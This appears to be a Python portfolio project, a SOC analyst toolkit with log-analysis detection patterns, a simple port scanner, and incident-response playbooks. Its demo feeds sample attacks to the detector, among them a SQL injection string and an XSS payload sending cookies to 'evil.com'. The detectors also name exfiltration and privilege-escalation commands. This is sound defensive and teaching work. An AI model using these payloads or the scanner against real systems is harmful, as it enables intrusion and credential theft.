"""
SOC Analyst Toolkit - Professional Cybersecurity Project
A comprehensive security monitoring and analysis platform for job interviews
"""

import hashlib
import json
import re
import socket
import subprocess
import threading
import time
from datetime import datetime
from collections import defaultdict, deque
from typing import Dict, List, Optional, Tuple
import ipaddress
import random
import os


class ThreatIntelligence:
    """Simulated threat intelligence feed with IOC matching"""
    
    def __init__(self):
        self.malicious_ips = {
            '192.168.1.100', '10.0.0.99', '172.16.0.50',
            '45.142.212.100', '185.220.101.42', '192.42.116.191'
        }
        self.malicious_domains = {
            'evil-c2.com', 'malware-dl.net', 'phishing-bank.xyz',
            'ransomware-payment.onion', 'darknet-market.cc'
        }
        self.known_hashes = {
            'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',  # Empty file
            '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8',  # Common test
        }
        
    def check_ip_reputation(self, ip: str) -> Dict:
        """Check if IP is in threat intelligence database"""
        threat_level = "CRITICAL" if ip in self.malicious_ips else "LOW"
        return {
            "ip": ip,
            "threat_level": threat_level,
            "is_malicious": ip in self.malicious_ips,
            "last_seen": datetime.now().isoformat() if ip in self.malicious_ips else None,
            "categories": ["C2 Server", "Malware Distribution"] if ip in self.malicious_ips else []
        }
    
    def check_file_hash(self, file_hash: str) -> Dict:
        """Check file hash against known malware database"""
        return {
            "hash": file_hash,
            "is_malicious": file_hash in self.known_hashes,
            "malware_family": "Unknown" if file_hash not in self.known_hashes else "Test.Malware",
            "confidence": 95 if file_hash in self.known_hashes else 0
        }


class LogAnalyzer:
    """Advanced log analysis engine with pattern detection"""
    
    def __init__(self):
        self.suspicious_patterns = {
            'brute_force': r'Failed password for .* from (\d+\.\d+\.\d+\.\d+)',
            'sql_injection': r'(\b(union|select|insert|update|delete|drop|exec)\b.*\b(from|into|table)\b)',
            'xss_attempt': r'(<script|javascript:|onerror=|onload=)',
            'privilege_escalation': r'(sudo.*-u\s+root|su\s+-\s*root|chmod\s+.*777)',
            'data_exfiltration': r'(scp.*@.*:|rsync.*-avz.*:|ftp.*put\s+)'
        }
        self.failed_logins = defaultdict(lambda: deque(maxlen=100))
        
    def analyze_auth_log(self, log_line: str) -> Optional[Dict]:
        """Analyze authentication logs for suspicious activity"""
        alert = None
        
        # Check for brute force attempts
        if match := re.search(self.suspicious_patterns['brute_force'], log_line, re.IGNORECASE):
            ip = match.group(1)
            self.failed_logins[ip].append(datetime.now())
            
            # Check rate: >5 failed attempts in 5 minutes
            recent = [t for t in self.failed_logins[ip] 
                     if (datetime.now() - t).seconds < 300]
            
            if len(recent) >= 5:
                alert = {
                    "type": "BRUTE_FORCE_ATTACK",
                    "severity": "HIGH",
                    "source_ip": ip,
                    "attempts": len(recent),
                    "time_window": "5 minutes",
                    "timestamp": datetime.now().isoformat(),
                    "recommendation": "Block IP immediately, enable MFA"
                }
        
        # Check for successful login after multiple failures
        if "Accepted password" in log_line and "from" in log_line:
            ip_match = re.search(r'from (\d+\.\d+\.\d+\.\d+)', log_line)
            if ip_match:
                ip = ip_match.group(1)
                if len(self.failed_logins.get(ip, [])) > 3:
                    alert = {
                        "type": "SUSPICIOUS_LOGIN",
                        "severity": "MEDIUM",
                        "source_ip": ip,
                        "details": "Successful login after multiple failures",
                        "timestamp": datetime.now().isoformat()
                    }
        
        return alert
    
    def analyze_web_log(self, log_line: str) -> Optional[Dict]:
        """Analyze web server logs for attacks"""
        alert = None
        
        # SQL Injection detection
        if re.search(self.suspicious_patterns['sql_injection'], log_line, re.IGNORECASE):
            alert = {
                "type": "SQL_INJECTION_ATTEMPT",
                "severity": "CRITICAL",
                "details": "Possible SQL injection pattern detected",
                "payload": log_line[:200],
                "timestamp": datetime.now().isoformat()
            }
        
        # XSS detection
        elif re.search(self.suspicious_patterns['xss_attempt'], log_line, re.IGNORECASE):
            alert = {
                "type": "XSS_ATTEMPT",
                "severity": "HIGH",
                "details": "Cross-site scripting attempt detected",
                "payload": log_line[:200],
                "timestamp": datetime.now().isoformat()
            }
        
        return alert


class NetworkScanner:
    """Network security scanner for vulnerability assessment"""
    
    def __init__(self):
        self.common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 8080, 8443]
        self.vulnerable_services = {
            21: "FTP - Often allows anonymous access",
            23: "Telnet - Cleartext authentication",
            445: "SMB - Check for EternalBlue vulnerability",
            3389: "RDP - Check for BlueKeep vulnerability",
            3306: "MySQL - Check for weak credentials"
        }
    
    def scan_host(self, target: str, port_range: Optional[List[int]] = None) -> Dict:
        """Perform port scan on target host"""
        ports = port_range or self.common_ports
        open_ports = []
        vulnerabilities = []
        
        print(f"[*] Scanning {target}...")
        
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target, port))
                
                if result == 0:
                    service = self._identify_service(port)
                    open_ports.append({"port": port, "service": service})
                    
                    if port in self.vulnerable_services:
                        vulnerabilities.append({
                            "port": port,
                            "issue": self.vulnerable_services[port],
                            "severity": "HIGH" if port in [23, 445] else "MEDIUM"
                        })
                sock.close()
            except Exception as e:
                continue
        
        return {
            "target": target,
            "scan_time": datetime.now().isoformat(),
            "open_ports": open_ports,
            "vulnerabilities_found": vulnerabilities,
            "risk_score": len(vulnerabilities) * 20 + len(open_ports) * 5
        }
    
    def _identify_service(self, port: int) -> str:
        """Map port to common service name"""
        services = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
            80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 445: "SMB",
            3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 8080: "HTTP-Proxy"
        }
        return services.get(port, "Unknown")


class IncidentResponse:
    """Automated incident response playbook engine"""
    
    def __init__(self):
        self.playbooks = {
            "MALWARE_DETECTION": [
                "Isolate affected host from network",
                "Capture memory dump for forensic analysis",
                "Block file hash on all endpoints",
                "Search IOCs across enterprise"
            ],
            "BRUTE_FORCE_ATTACK": [
                "Block source IP at firewall",
                "Review authentication logs for successful logins",
                "Force password reset for affected accounts",
                "Enable additional MFA checks"
            ],
            "DATA_EXFILTRATION": [
                "Isolate affected systems immediately",
                "Preserve network traffic logs",
                "Identify scope of data accessed",
                "Notify legal and compliance teams"
            ],
            "SQL_INJECTION_ATTEMPT": [
                "Block source IP at WAF",
                "Review application logs for successful injection",
                "Check database for unauthorized changes",
                "Patch identified vulnerabilities"
            ]
        }
        self.active_incidents = []
        self.incident_counter = 1000
    
    def create_incident(self, alert: Dict, affected_assets: List[str]) -> Dict:
        """Create incident ticket from security alert"""
        self.incident_counter += 1
        incident_id = f"INC-{self.incident_counter}"
        
        incident = {
            "id": incident_id,
            "title": alert.get("type", "Unknown Threat"),
            "severity": alert.get("severity", "MEDIUM"),
            "status": "OPEN",
            "created_at": datetime.now().isoformat(),
            "affected_assets": affected_assets,
            "description": alert.get("details", "No details provided"),
            "playbook": self.playbooks.get(alert.get("type"), ["Manual investigation required"]),
            "timeline": [{
                "time": datetime.now().isoformat(),
                "action": "Incident created",
                "analyst": "Automated System"
            }]
        }
        
        self.active_incidents.append(incident)
        return incident
    
    def execute_response(self, incident_id: str, action: str) -> Dict:
        """Execute response action on incident"""
        for incident in self.active_incidents:
            if incident["id"] == incident_id:
                incident["timeline"].append({
                    "time": datetime.now().isoformat(),
                    "action": action,
                    "analyst": "SOC Analyst"
                })
                
                if action == "CONTAIN":
                    incident["status"] = "CONTAINED"
                elif action == "RESOLVE":
                    incident["status"] = "RESOLVED"
                elif action == "ESCALATE":
                    incident["status"] = "ESCALATED"
                
                return incident
        return None


class SecurityDashboard:
    """Real-time security monitoring dashboard"""
    
    def __init__(self):
        self.threat_intel = ThreatIntelligence()
        self.log_analyzer = LogAnalyzer()
        self.network_scanner = NetworkScanner()
        self.incident_response = IncidentResponse()
        self.metrics = {
            "alerts_generated": 0,
            "incidents_created": 0,
            "ips_blocked": 0,
            "files_quarantined": 0
        }
        self.running = False
    
    def start_monitoring(self):
        """Start continuous security monitoring"""
        self.running = True
        print("\n" + "="*60)
        print("🔒 SOC ANALYST TOOLKIT - SECURITY MONITORING STARTED")
        print("="*60)
        
        # Simulate monitoring in separate thread
        monitor_thread = threading.Thread(target=self._monitoring_loop)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        return self
    
    def _monitoring_loop(self):
        """Internal monitoring loop"""
        while self.running:
            time.sleep(2)
            # In real implementation, this would tail actual logs
            pass
    
    def analyze_file(self, filepath: str) -> Dict:
        """Analyze file for malware indicators"""
        try:
            with open(filepath, 'rb') as f:
                file_hash = hashlib.sha256(f.read()).hexdigest()
            
            result = self.threat_intel.check_file_hash(file_hash)
            result["filepath"] = filepath
            result["file_size"] = os.path.getsize(filepath)
            
            if result["is_malicious"]:
                self.metrics["files_quarantined"] += 1
                alert = {
                    "type": "MALWARE_DETECTION",
                    "severity": "CRITICAL",
                    "details": f"Malware detected: {result['malware_family']}"
                }
                incident = self.incident_response.create_incident(
                    alert, [filepath]
                )
                result["incident_id"] = incident["id"]
            
            return result
            
        except Exception as e:
            return {"error": str(e)}
    
    def process_log_entry(self, log_type: str, log_line: str) -> Optional[Dict]:
        """Process single log entry through analysis pipeline"""
        alert = None
        
        if log_type == "auth":
            alert = self.log_analyzer.analyze_auth_log(log_line)
        elif log_type == "web":
            alert = self.log_analyzer.analyze_web_log(log_line)
        
        if alert:
            self.metrics["alerts_generated"] += 1
            # Auto-create incident for critical alerts
            if alert["severity"] in ["CRITICAL", "HIGH"]:
                incident = self.incident_response.create_incident(
                    alert, ["server-01", "web-server-02"]
                )
                alert["incident_id"] = incident["id"]
                self.metrics["incidents_created"] += 1
        
        return alert
    
    def generate_report(self) -> Dict:
        """Generate security posture report"""
        return {
            "timestamp": datetime.now().isoformat(),
            "metrics": self.metrics,
            "active_incidents": len([
                i for i in self.incident_response.active_incidents 
                if i["status"] == "OPEN"
            ]),
            "threat_level": self._calculate_threat_level(),
            "recommendations": self._generate_recommendations()
        }
    
    def _calculate_threat_level(self) -> str:
        """Calculate overall threat level based on metrics"""
        score = (self.metrics["alerts_generated"] * 2 + 
                self.metrics["incidents_created"] * 5 +
                self.metrics["ips_blocked"] * 1)
        
        if score > 50:
            return "CRITICAL"
        elif score > 20:
            return "HIGH"
        elif score > 5:
            return "MEDIUM"
        return "LOW"
    
    def _generate_recommendations(self) -> List[str]:
        """Generate security recommendations based on activity"""
        recs = []
        if self.metrics["alerts_generated"] > 10:
            recs.append("Consider tuning detection rules to reduce false positives")
        if self.metrics["incidents_created"] > 5:
            recs.append("Review incident response procedures for efficiency")
        if not recs:
            recs.append("Security posture is stable - maintain current controls")
        return recs
    
    def display_menu(self):
        """Interactive menu for demonstration"""
        while True:
            print("\n" + "="*50)
            print("🛡️  SOC ANALYST TOOLKIT - MAIN MENU")
            print("="*50)
            print("1. Analyze File for Malware")
            print("2. Process Authentication Log")
            print("3. Process Web Server Log")
            print("4. Scan Network Host")
            print("5. View Active Incidents")
            print("6. Execute Incident Response")
            print("7. Generate Security Report")
            print("8. Check IP Reputation")
            print("9. Exit")
            
            choice = input("\nSelect option (1-9): ").strip()
            
            if choice == "1":
                filepath = input("Enter file path to analyze: ")
                result = self.analyze_file(filepath)
                print(json.dumps(result, indent=2))
            
            elif choice == "2":
                print("Example: 'Failed password for admin from 192.168.1.100'")
                log = input("Enter auth log line: ")
                result = self.process_log_entry("auth", log)
                if result:
                    print(f"🚨 ALERT GENERATED: {result['type']}")
                    print(json.dumps(result, indent=2))
                else:
                    print("✅ No threats detected")
            
            elif choice == "3":
                print("Example: 'GET /search?q=<script>alert(1)</script>'")
                log = input("Enter web log line: ")
                result = self.process_log_entry("web", log)
                if result:
                    print(f"🚨 ALERT GENERATED: {result['type']}")
                    print(json.dumps(result, indent=2))
                else:
                    print("✅ No threats detected")
            
            elif choice == "4":
                target = input("Enter IP/hostname to scan: ")
                result = self.network_scanner.scan_host(target)
                print(json.dumps(result, indent=2))
            
            elif choice == "5":
                print("\n📋 ACTIVE INCIDENTS:")
                for inc in self.incident_response.active_incidents:
                    status_icon = "🔴" if inc["status"] == "OPEN" else "🟡" if inc["status"] == "CONTAINED" else "🟢"
                    print(f"{status_icon} {inc['id']}: {inc['title']} [{inc['severity']}]")
            
            elif choice == "6":
                inc_id = input("Enter Incident ID: ")
                print("Actions: CONTAIN, RESOLVE, ESCALATE")
                action = input("Enter action: ").upper()
                result = self.incident_response.execute_response(inc_id, action)
                if result:
                    print(f"✅ Incident {inc_id} updated to {result['status']}")
                else:
                    print("❌ Incident not found")
            
            elif choice == "7":
                report = self.generate_report()
                print(json.dumps(report, indent=2))
            
            elif choice == "8":
                ip = input("Enter IP address: ")
                result = self.threat_intel.check_ip_reputation(ip)
                print(json.dumps(result, indent=2))
            
            elif choice == "9":
                print("👋 Stay secure!")
                break


def demo_simulation():
    """Run automated demonstration of capabilities"""
    print("\n" + "="*70)
    print("🔐 AUTOMATED SOC TOOLKIT DEMONSTRATION")
    print("="*70)
    
    soc = SecurityDashboard()
    
    # Demo 1: Malware Analysis
    print("\n[1] Creating test file and analyzing...")
    test_file = "/tmp/test_malware.txt"
    with open(test_file, 'w') as f:
        f.write("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
    
    result = soc.analyze_file(test_file)
    print(f"File Analysis: {result.get('is_malicious', False)}")
    
    # Demo 2: Log Analysis - Brute Force
    print("\n[2] Simulating brute force attack detection...")
    for i in range(7):
        log = f"Failed password for root from 192.168.1.100 port 22"
        alert = soc.process_log_entry("auth", log)
        if alert:
            print(f"Detected: {alert['type']} - {alert['severity']}")
            print(f"Auto-created incident: {alert.get('incident_id')}")
    
    # Demo 3: Web Attack Detection
    print("\n[3] Detecting web attacks...")
    attacks = [
        "GET /login?user=admin' UNION SELECT * FROM passwords--",
        "POST /comment body=<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>"
    ]
    for attack in attacks:
        alert = soc.process_log_entry("web", attack)
        if alert:
            print(f"Blocked: {alert['type']}")
    
    # Demo 4: Network Scan
    print("\n[4] Scanning localhost...")
    scan_result = soc.network_scanner.scan_host("127.0.0.1")
    print(f"Found {len(scan_result['open_ports'])} open ports")
    if scan_result['vulnerabilities_found']:
        print(f"⚠️  {len(scan_result['vulnerabilities_found'])} vulnerabilities detected")
    
    # Demo 5: Generate Report
    print("\n[5] Generating security report...")
    report = soc.generate_report()
    print(f"Current Threat Level: {report['threat_level']}")
    print(f"Active Incidents: {report['active_incidents']}")
    print(f"Recommendations: {report['recommendations']}")
    
    print("\n" + "="*70)
    print("✅ DEMONSTRATION COMPLETE")
    print("This project showcases: Threat Intel, Log Analysis, Network Security,")
    print("Incident Response, and Security Automation - perfect for SOC interviews!")
    print("="*70)
    
    # Cleanup
    os.remove(test_file)


if __name__ == "__main__":
    import sys
    
    if len(sys.argv) > 1 and sys.argv[1] == "--demo":
        demo_simulation()
    else:
        print("Usage:")
        print("  python soc_toolkit.py --demo    # Run automated demo")
        print("  python soc_toolkit.py           # Run interactive mode")
        print("\nStarting interactive mode...\n")
        
        dashboard = SecurityDashboard()
        dashboard.start_monitoring()
        dashboard.display_menu()
